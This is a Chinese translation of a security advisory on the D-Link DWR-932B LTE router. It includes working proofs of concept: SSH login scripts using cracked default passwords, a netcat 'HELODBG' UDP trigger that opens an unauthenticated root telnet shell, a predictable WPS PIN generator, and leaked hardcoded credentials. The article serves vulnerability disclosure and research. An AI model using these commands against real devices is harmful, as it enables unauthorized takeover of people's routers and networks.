# 【技术分享】Dlink DWR-932B路由器被爆多个安全漏洞

阅读量 **219421**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-10-05 09:30:04

 **x**

##### 译文声明

本文是翻译文章，文章来源：安全客

原文地址：<https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html>

译文仅供参考，具体内容表达以及含义原文为准。

**前言**

根据安全研究专家的最新发现，Dlink
DWR-932B路由器中存在大量的安全漏洞，包括后门、后门账号、弱WPS、以及远程代码执行漏洞等等。如果你对物联网安全方面感兴趣的话，可以选择拿这款路由器来练练手。

**漏洞概述**

Dlink
DWR-932B路由器是一款LTE路由器，由于这款路由器的整体设计存在非常严重的问题，导致该设备中存在大量的安全漏洞。Dlink是一个跨国的网络设备制造商，而这款路由器目前已经销往了全球的多个国家和地区。需要注意的是，这款设备现在正在为多国的企业和组织提供互联网服务，所以这些漏洞必定会将相关企业置于安全风险之中。根据安全研究专家的描述，Dlink
DWR-932B路由器中的一个核心功能模块是基于Quanta LTE路由器模块来实现的。而不幸的是，该模块不仅从Quanta
LTE路由器那里继承了其通信功能，而且还将其中的安全漏洞带到了Dlink DWR-932B路由器的身上。

Dlink DWR-932B路由器中存在的安全漏洞如下所示：

> －后门账号
>
> －后门
>
> －默认WPS PIN码
>
> －弱WPS PIN码生成
>
> －泄漏No-IP账号
>
> －HTTP守护进程（qmiweb）中存在多个漏洞
>
> －远程FOTA
>
> －安全实践方案存在缺陷
>
> －UPnP安全问题

在接下来的漏洞分析测试过程中，我们使用的是最新版的官方固件(固件 DWR-932_fw_revB_2_02_eu_en_20150709.zip, 模块版本
B,
/Share3/DailyBuild/QDX_DailyBuild/QDT_2031_DLINK/QDT_2031_OS/source/LINUX/apps_proc/oe-core/build/tmp-eglibc/sysroots/x86_64-linux/usr/bin/armv7a-vfp-neon-oe-linux-gnueabi/arm-oe-linux-gnueabi-gcc)。

安全专家的观点：如果你是一个积极乐观的人，那么你可以认为这些漏洞的存在是由制造商的疏忽大意而造成的。如果你是一个阴谋论者，那么你也可以认为这些漏洞是制造商故意设计的。这篇文章并没有将所有已发现的相关漏洞披露出来，我们在这篇文章中只对其中一些影响比较严重的安全漏洞进行了分析。需要注意的是，目前这款路由器设备仍然在售。

由于制造商目前还没有向用户提供产品的安全更新补丁，所以这些漏洞目前仍然无法得到修复。如果广大用户对此有任何疑问的话，可以尝试与当地的D-Link服务点取得联系。

**漏洞细节分析－后门账号**

默认配置下，telnetd和SSHd这两个服务程序都会在路由器中运行。需要注意的是，即便是路由器设备中没有提供任何关于telnetd程序的文档和信息，这个服务程序仍然会在路由器中运行：

    
    
    user@kali:~$ cat ./etc/init.d/start_appmgr
     
    [...]
    #Sandro { for telnetd debug...
    start-stop-daemon -S -b -a /bin/logmaster
    #if [ -e /config2/telnetd ]; then
            start-stop-daemon -S -b -a /sbin/telnetd
    #fi
    #Sandro }
    [...]

安全研究专家在这款路由器内发现了两个后门账号，攻击者或可利用这两个后门账号来绕过路由器的HTTP身份验证机制，并获取到路由器的管理权限。

    
    
    admin@homerouter:~$ grep admin /etc/passwd
    admin:htEcF9TWn./9Q:168:168:admin:/:/bin/sh
    admin@homerouter:~$

在IDA的帮助下，研究人员在“/bin/appmgr”中发现了路由器的管理员账号。设备的管理员账号默认为“admin”，而密码同样也是“admin”。

关于root用户的信息如下所示：

    
    
    user@kali:~$ cat ./etc/shadow
    root:aRDiHrJ0OkehM:16270:0:99999:7:::
    daemon:*:16270:0:99999:7:::
    bin:*:16270:0:99999:7:::
    sys:*:16270:0:99999:7:::
    sync:*:16270:0:99999:7:::
    games:*:16270:0:99999:7:::
    man:*:16270:0:99999:7:::
    lp:*:16270:0:99999:7:::
    mail:*:16270:0:99999:7:::
    news:*:16270:0:99999:7:::
    uucp:*:16270:0:99999:7:::
    proxy:*:16270:0:99999:7:::
    www-data:*:16270:0:99999:7:::
    backup:*:16270:0:99999:7:::
    list:*:16270:0:99999:7:::
    irc:*:16270:0:99999:7:::
    gnats:*:16270:0:99999:7:::
    diag:*:16270:0:99999:7:::
    nobody:*:16270:0:99999:7:::
    messagebus:!:16270:0:99999:7:::
    avahi:!:16270:0:99999:7:::
    admin@kali:~$

使用哈希破解神器John The Ripper来破解我们所获取到的密码哈希：

    
    
    user@kali:~$ john -show shadow+passwd
    admin:admin:admin:/:/bin/sh
    root:1234:16270:0:99999:7:::
     
    2 password hashes cracked, 0 left
    user@kali:~$

分析结果如下：

    
    
    －admin账号的密码为“admin”
    －root账号的密码为“1234”

**利用admin账号完成漏洞利用**
（代替方案，仅供参考［[传送门](https://pierrekim.github.io/advisories/quanta-ssh-default-password-admin)］）：

    
    
    user@kali:~$ cat quanta-ssh-default-password-admin
    #!/usr/bin/expect -f
     
    set timeout 3
    spawn ssh admin@192.168.1.1
    expect "password: $"
    send "adminr"
    interact
    user@kali:~$ ./quanta-ssh-default-password-admin
    spawn ssh admin@192.168.1.1
    admin@192.168.1.1's password:
    admin@homerouter:~$ id
    uid=168(admin) gid=168(admin) groups=168(admin)
    admin@homerouter:~$

**利用root账号完成漏洞利用**
：（代替方案，仅供参考［[传送门](https://pierrekim.github.io/advisories/quanta-ssh-default-password-root)］）：

    
    
    user@kali:~$ cat quanta-ssh-default-password-root
    #!/usr/bin/expect -f
     
    set timeout 3
    spawn ssh root@192.168.1.1
    expect "password: $"
    send "1234r"
    interact
    user@kali:~$ ./quanta-ssh-default-password-root
    spawn ssh root@192.168.1.1
    root@192.168.1.1's password:
    root@homerouter:~# id
    uid=168(root) gid=168(root) groups=168(root)
    root@homerouter:~#

**漏洞细节分析－后门**

安全研究专家还发现，在“/bin/appmgr”程序中还存在一个后门程序。如果telnetd守护进程没有处于运行状态的话，攻击者可以通过向目标路由器发送一个特殊字符串（使用UDP协议）来开启一个未经身份验证的telnet服务器。

在“/bin/appmgr”中，有一个线程会持续监听0.0.0.0:39889（UDP），并等待传入控制命令。

如果某个用户向目标路由器发送了一个“HELODBG”字符串，那么路由器将会执行“/sbin/telnetd -l
/bin/sh”，并允许这名用户在未经身份验证的情况下以root用户的身份登录路由器。

在使用IDA来对程序进行分析的过程中，我们可以看到该后门存在于源程序的main函数之中（代码的第369行）：

概念验证实例（PoC）：

    
    
    user@kali:~$ echo -ne "HELODBG" | nc -u 192.168.1.1 39889
    Hello
    ^C
    user@kali:~$ telnet 192.168.1.1
    Trying 192.168.1.1...
    Connected to 192.168.1.1.
    Escape character is '^]'.
     
    OpenEmbedded Linux homerouter.cpe
     
     
    msm 20141210 homerouter.cpe
     
    / # id
    uid=0(root) gid=0(root)
    / # exit
    Connection closed by foreign host.
    user@kali:~$

**漏洞细节分析－默认WPS PIN码**

路由器中的WPS是由Wi-Fi联盟所推出的全新Wi-Fi安全防护设定(Wi-Fi Protected
Setup)标准，该标准推出的主要原因是为了解决长久以来无线网络加密认证设定的步骤过于繁杂艰难之弊病，使用者往往会因为步骤太过麻烦，以致干脆不做任何加密安全设定，因而引发许多安全上的问题。我们可以在路由器中的help.html中查看到相关的信息。

默认配置下，该路由器WPS系统的PIN码永远都是“28296607”。实际上，这个PIN码是硬编码在“/bin/appmgr”程序中的。

除此之外，我们不仅还可以在HostAP配置中找到这个PIN码，而且由于设备存在信息泄漏的问题，所以我们也可以在路由器的HTTP API接口中找到该PIN码：

    
    
    root@homerouter:~# ps -a|grep hostap
     1006 root       0:00 hostapd /var/wifi/ar6k0.conf
     1219 root       0:00 grep hostap
    root@homerouter:~# cat /var/wifi/ar6k0.conf
    [...]
    ap_pin=28296607
    [...]

**漏洞细节分析－弱WPS PIN码生成**

用户可以在路由器的Web管理界面中为WPS系统生成一个临时的PIN码，但是一般用户都不会这样做，因为路由器默认已经帮用户生成了一个WPS
PIN码（28296607）。

路由器所生成的PIN码强度非常弱，因为它使用的是一个非常“奇怪”的逆向工程算法。相关代码如下所示［[点我获取quanta-wps-gen.c](https://pierrekim.github.io/advisories/quanta-wps-gen.c)］：

    
    
    user@kali:~$ cat quanta-wps-gen.c
    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <time.h>
     
    int main(int    argc,
             char   **argv,
             char   **envp)
    {
      unsigned int  i0, i1;
      int           i2;
     
      /* the seed is the current time of the router, which uses NTP... */
      srand(time(0));
     
      i0 = rand() % 10000000;
      if (i0 <= 999999)
        i0 += 1000000;
      i1 = 10 * i0;
      i2 = (10 - (i1 / 10000 % 10 + i1 / 1000000 % 10 + i1 / 100 % 10 + 3 *
           (i1 / 100000 % 10 + 10 * i0 / 10000000 % 10 + i1 / 1000 % 10 + i1 / 10 % 10))
            % 10) % 10 + 10 * i0;
     
      printf("%dn", i2 );
     
      return (0);
    }
    
    
    user@kali:~$ gcc -o dlink-wps-gen quanta-wps-gen.c
    user@kali:~$ ./dlink-wps-gen
    97329329
    user@kali:~$

我们可以从上面的代码中看到，其使用了srand(time(0))来作为种子，这是一种非常不安全的做法。因为time(0)会以整形数值的形式返回当前的时间，而攻击者同样可以获取到当前时间。这样一来，攻击者就可以随意生成一个有效的WPS
PIN码了。由于路由器使用了网络时间协议（NTP），所以设备的时间戳设置应该没什么问题。这也就意味着，攻击者将可以轻松地生成大量有效的WPS PIN码。

为了满足各位同学们的好奇心，我们在下方给出了固件中的初始算法：

    
    
    .text:0001B4D4                 EXPORT generate_wlan_wps_enrollee_pin
    .text:0001B4D4 generate_wlan_wps_enrollee_pin          ; CODE XREF: wifi_msg_handle+194p
    .text:0001B4D4
    .text:0001B4D4 var_3C          = -0x3C
    .text:0001B4D4 var_38          = -0x38
    .text:0001B4D4 s               = -0x34
    .text:0001B4D4 var_30          = -0x30
    .text:0001B4D4 var_2C          = -0x2C
    .text:0001B4D4
    .text:0001B4D4                 STMFD           SP!, {R4-R11,LR}
    .text:0001B4D8                 SUB             SP, SP, #0x1C
    .text:0001B4DC                 STR             R0, [SP,#0x40+s]
    .text:0001B4E0                 MOV             R0, #0  ; timer
    .text:0001B4E4                 BL              time
    .text:0001B4E8                 BL              srand
    .text:0001B4EC                 BL              rand
    .text:0001B4F0                 LDR             R4, =0x6B5FCA6B
    .text:0001B4F4                 MOV             R6, R0,ASR#31
    .text:0001B4F8                 SMULL           R1, R4, R0, R4
    .text:0001B4FC                 RSB             R10, R6, R4,ASR#22
    .text:0001B500                 RSB             R12, R10, R10,LSL#5
    .text:0001B504                 RSB             R2, R12, R12,LSL#6
    .text:0001B508                 ADD             R11, R10, R2,LSL#3
    .text:0001B50C                 LDR             R8, =0xF423F
    .text:0001B510                 ADD             R9, R11, R11,LSL#2
    .text:0001B514                 SUB             R1, R0, R9,LSL#7
    .text:0001B518                 CMP             R1, R8
    .text:0001B51C                 ADDLS           R1, R1, #0xF4000
    .text:0001B520                 ADDLS           R1, R1, #0x240
    .text:0001B524                 ADD             R3, R1, R1,LSL#2
    .text:0001B528                 MOV             R3, R3,LSL#1
    .text:0001B52C                 LDR             R1, =0xCCCCCCCD
    .text:0001B530                 LDR             R5, =0xA7C5AC5
    .text:0001B534                 LDR             R6, =0x6B5FCA6B
    .text:0001B538                 MOV             R7, R3,LSR#5
    .text:0001B53C                 UMULL           R4, R7, R5, R7
    .text:0001B540                 UMULL           R9, LR, R1, R3
    .text:0001B544                 UMULL           R5, R6, R3, R6
    .text:0001B548                 LDR             R12, =0xD1B71759
    .text:0001B54C                 MOV             R6, R6,LSR#22
    .text:0001B550                 UMULL           R10, R12, R3, R12
    .text:0001B554                 MOV             LR, LR,LSR#3
    .text:0001B558                 UMULL           R10, R9, R1, R6
    .text:0001B55C                 UMULL           R8, R10, R1, LR
    .text:0001B560                 LDR             R0, =0x431BDE83
    .text:0001B564                 MOV             R12, R12,LSR#13
    .text:0001B568                 UMULL           R11, R0, R3, R0
    .text:0001B56C                 STR             R10, [SP,#0x40+var_38]
    .text:0001B570                 UMULL           R8, R10, R1, R12
    .text:0001B574                 LDR             R2, =0x51EB851F
    .text:0001B578                 LDR             R4, =0x10624DD3
    .text:0001B57C                 UMULL           R5, R2, R3, R2
    .text:0001B580                 MOV             R0, R0,LSR#18
    .text:0001B584                 STR             R10, [SP,#0x40+var_3C]
    .text:0001B588                 UMULL           R8, R4, R3, R4
    .text:0001B58C                 UMULL           R8, R10, R1, R0
    .text:0001B590                 MOV             R2, R2,LSR#5
    .text:0001B594                 MOV             R7, R7,LSR#7
    .text:0001B598                 UMULL           R8, R11, R1, R7
    .text:0001B59C                 STR             R10, [SP,#0x40+var_30]
    .text:0001B5A0                 MOV             R4, R4,LSR#6
    .text:0001B5A4                 UMULL           R8, R10, R1, R2
    .text:0001B5A8                 UMULL           R8, R5, R1, R4
    .text:0001B5AC                 STR             R10, [SP,#0x40+var_2C]
    .text:0001B5B0                 MOV             R8, R9,LSR#3
    .text:0001B5B4                 MOV             R10, R11,LSR#3
    .text:0001B5B8                 ADD             R11, R10, R10,LSL#2
    .text:0001B5BC                 ADD             R9, R8, R8,LSL#2
    .text:0001B5C0                 MOV             R10, R5,LSR#3
    .text:0001B5C4                 LDR             R8, [SP,#0x40+var_38]
    .text:0001B5C8                 SUB             R6, R6, R9,LSL#1
    .text:0001B5CC                 SUB             R7, R7, R11,LSL#1
    .text:0001B5D0                 LDR             R9, [SP,#0x40+var_3C]
    .text:0001B5D4                 LDR             R11, [SP,#0x40+var_30]
    .text:0001B5D8                 ADD             R5, R10, R10,LSL#2
    .text:0001B5DC                 SUB             R5, R4, R5,LSL#1
    .text:0001B5E0                 LDR             R4, [SP,#0x40+var_2C]
    .text:0001B5E4                 MOV             R10, R8,LSR#3
    .text:0001B5E8                 MOV             R8, R9,LSR#3
    .text:0001B5EC                 MOV             R9, R11,LSR#3
    .text:0001B5F0                 ADD             R7, R7, R6
    .text:0001B5F4                 ADD             R10, R10, R10,LSL#2
    .text:0001B5F8                 ADD             R9, R9, R9,LSL#2
    .text:0001B5FC                 MOV             R11, R4,LSR#3
    .text:0001B600                 ADD             R8, R8, R8,LSL#2
    .text:0001B604                 ADD             R7, R7, R5
    .text:0001B608                 SUB             LR, LR, R10,LSL#1
    .text:0001B60C                 SUB             R5, R0, R9,LSL#1
    .text:0001B610                 SUB             R8, R12, R8,LSL#1
    .text:0001B614                 ADD             R11, R11, R11,LSL#2
    .text:0001B618                 ADD             R12, R7, LR
    .text:0001B61C                 SUB             R4, R2, R11,LSL#1
    .text:0001B620                 ADD             R8, R8, R5
    .text:0001B624                 ADD             R5, R8, R4
    .text:0001B628                 ADD             R0, R12, R12,LSL#1
    .text:0001B62C                 ADD             R4, R5, R0
    .text:0001B630                 UMULL           R5, R1, R4, R1
    .text:0001B634                 MOV             R2, R1,LSR#3
    .text:0001B638                 ADD             LR, R2, R2,LSL#2
    .text:0001B63C                 SUB             R8, R4, LR,LSL#1
    .text:0001B640                 LDR             R0, =0x66666667
    .text:0001B644                 RSB             R2, R8, #0xA
    .text:0001B648                 SMULL           R8, R0, R2, R0
    .text:0001B64C                 MOV             R12, R2,ASR#31
    .text:0001B650                 RSB             R1, R12, R0,ASR#2
    .text:0001B654                 ADD             LR, R1, R1,LSL#2
    .text:0001B658                 LDR             R12, =(aHostapd_conf_f - 0x1B670)
    .text:0001B65C                 SUB             R4, R2, LR,LSL#1
    .text:0001B660                 LDR             R2, =(aGet_wpspinI - 0x1B67C)
    .text:0001B664                 ADD             R4, R4, R3
    .text:0001B668                 ADD             R0, PC, R12 ; "hostapd_conf_file_gen"
    .text:0001B66C                 ADD             R0, R0, #0x3C
    .text:0001B670                 MOV             R1, #0x3B
    .text:0001B674                 ADD             R2, PC, R2 ; "Get_WpsPin:%in"
    .text:0001B678                 MOV             R3, R4
    .text:0001B67C                 BL              wifi_filelog
    .text:0001B680                 LDR             R1, =(a08lu - 0x1B690)
    .text:0001B684                 LDR             R0, [SP,#0x40+s] ; s
    .text:0001B688                 ADD             R1, PC, R1 ; "%08lu"
    .text:0001B68C                 MOV             R2, R4
    .text:0001B690                 ADD             SP, SP, #0x1C
    .text:0001B694                 LDMFD           SP!, {R4-R11,LR}
    .text:0001B698                 B               sprintf
    .text:0001B698 ; End of function generate_wlan_wps_enrollee_pin

**  
**

**漏洞细节分析－泄漏NO-IP账号（？）**

文件“/etc/inadyn-mt.conf”(针对dyndns客户端)中包含有一个用户名（alex_hung）和一个硬编码的密码：

    
    
    --log_file /usr/inadyn_srv.log
    --forced_update_period 6000
    --username alex_hung
    --password 641021
    --dyndns_system default@no-ip.com
    --alias test.no-ip.com

**漏洞细节分析－HTTP守护进程（qmiweb）中存在多个漏洞**

安全研究专家在测试过程中发现，HTTP守护进程（/bin/qmiweb）中还存在大量的安全漏洞。

各位同学可以参考我之前的分析报告，这个路由器模块使用的也是类似的固件。［[报告传送门](https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html)］

关于这些漏洞的利用方式我就不再进行赘述了，感兴趣的同学可以自己动手尝试一下，这部分内容就当作家庭作业啦！

**漏洞细节分析－远程FOTA**

路由器与FOTA服务器进行通信时的凭证数据硬编码在“/sbin/fotad”代码中，我们用IDA对代码进行了分析，具体如下图所示：

函数sub_CAAC中包含有凭证数据，（一个已采用base64进行编码的字符串），路由器需要通过这个凭证来从远程服务器获取固件。

值得注意的是，FOTA守护进程会使用HTTPS协议来尝试获取固件。但是在这篇报告发表时，https://qdp:qdp@fotatest.qmitw.com/qdh/ispname/2031/appliance.xml
的SSL证书已经过期长达一年半之久了。

用户/密码如下所示：

    
    
    qdpc:qdpc
    qdpe:qdpe
    qdp:qdp

漏洞细节分析－安全实践方案存在缺陷

你可以从“/etc/init.d/start_appmgr”中看到很多奇怪的shell命令，这些命令全部都是以root权限执行的。具体如下所示：

    
    
    if [  -f /sbin/netcfg ]; then
            echo -n "chmod 777 netcfg"
            chmod 777 /sbin/netcfg
    fi
    if [  -f /bin/QNetCfg ]; then
            echo -n "chmod 777 QNetCfg"
            chmod 777 /bin/QNetCfg
    fi

“chmod 777”命令执行后，将会赋予相应文件完整的读/写/执行权限，所以我不太明白制造商为什么要对“/bin/”目录下的文件进行这样的操作。

**漏洞细节分析－UPnP安全问题**

UPnP允许用户动态添加防火墙规则。因为这种做法会带来一定的安全风险，因此设备通常都会对这种操作进行限制，以避免不受信任的客户端添加不安全的防火墙规则。

IPnP的不安全性早在2006年就已经是众所周知的事情了。而该路由器中UPnP程序的安全等级仍然非常的低，处于局域网内的攻击者可以随意修改路由器的端口转发规则。

文件“/var/miniupnpd.conf”是由“/bin/appmgr”程序生成的：

该程序会生成“/var/miniupnpd.conf”：

    
    
    ext_ifname=rmnet0
    listening_ip=bridge0
    port=2869
    enable_natpmp=yes
    enable_upnp=yes
    bitrate_up=14000000
    bitrate_down=14000000
    secure_mode=no      # "secure" mode : when enabled, UPnP client are allowed to add mappings only to their IP.
    presentation_url=http://192.168.1.1
    system_uptime=yes
    notify_interval=30
    upnp_forward_chain=MINIUPNPD
    upnp_nat_chain=MINIUPNPD

在配置文件中，并没有对UPnP权限规则进行任何限制。在普通的配置文件中，一般只允许端口号在1024以上的端口进行重定向操作。

    
    
    # UPnP permission rules
    # (allow|deny) (external port range) ip/mask (internal port range)
    # A port range is <min port>-<max port> or <port> if there is only
    # one port in the range.
    # ip/mask format must be nn.nn.nn.nn/nn
    # it is advised to only allow redirection of port above 1024
    # and to finish the rule set with "deny 0-65535 0.0.0.0/0 0-65535"
    allow 1024-65535 192.168.0.0/24 1024-65535
    deny 0-65535 0.0.0.0/0 0-65535

**总结**

在测试过程中，我们还可以利用一个自定义固件（带有后门）来重写路由器设备的初始固件。如果各位同学感兴趣的话，可以自己动手尝试生成一个带有后门的路由固件。但是由于路由器的默认固件中存在如此之多的安全漏洞，我觉得其实也没必要自己再去制作一个带有后门的自定义固件了。

**参考资料**

－<https://pierrekim.github.io/advisories/2016-dlink-0x00.txt>

－<https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html>

－<https://www.linkedin.com/pulse/rooting-dlink-dwr-923-4g-router-gianni-carabelli>

本文翻译自安全客 [原文链接](https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **WisFree** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/84671](/post/id/84671)

安全客 - 有思想的安全新媒体

本文转载自: [安全客](https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html)

如若转载,请注明出处： <https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p5.ssl.qhimg.com/t014c3fa13dce6c85dd.png) WisFree

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

